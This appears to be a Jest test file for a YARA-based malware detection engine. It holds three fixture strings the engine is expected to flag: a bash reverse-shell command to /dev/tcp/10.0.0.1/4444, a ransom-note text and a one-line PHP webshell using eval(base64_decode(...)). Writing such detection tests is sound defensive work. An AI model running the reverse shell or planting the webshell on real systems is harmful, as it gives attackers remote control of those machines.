const YaraEngine = require("../core/detection/YaraEngine");
const path = require("path");

describe("YaraEngine Parser & Scanning Tests", () => {
    let yara;

    beforeAll(async () => {
        yara = new YaraEngine(path.join(__dirname, "../rules/yara"));
        await yara.loadRules();
    });

    test("should have loaded default YARA rules from disk", () => {
        expect(yara.rules.length).toBeGreaterThanOrEqual(4);
    });

    test("should detect reverse shell payload string", () => {
        const payload = "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        const matches = yara.scan(payload);
        expect(matches.length).toBeGreaterThanOrEqual(1);
        expect(matches.some(m => m.rule === "Reverse_Shell_Payload")).toBe(true);
    });

    test("should detect ransomware ransom note indicators", () => {
        const note = "ATTENTION! Your files have been encrypted! Pay bitcoin to the following address to recover.";
        const matches = yara.scan(note);
        expect(matches.some(m => m.rule === "Ransomware_Note_And_Extension")).toBe(true);
    });

    test("should detect webshell command execution patterns", () => {
        const phpWebshell = '<?php eval(base64_decode($_POST["cmd"])); ?>';
        const matches = yara.scan(phpWebshell);
        expect(matches.some(m => m.rule === "Generic_Webshell_PHP_JSP")).toBe(true);
    });

    test("should not match clean harmless text", () => {
        const cleanText = "Hello world, this is a clean log message from the system.";
        const matches = yara.scan(cleanText);
        expect(matches).toHaveLength(0);
    });
});
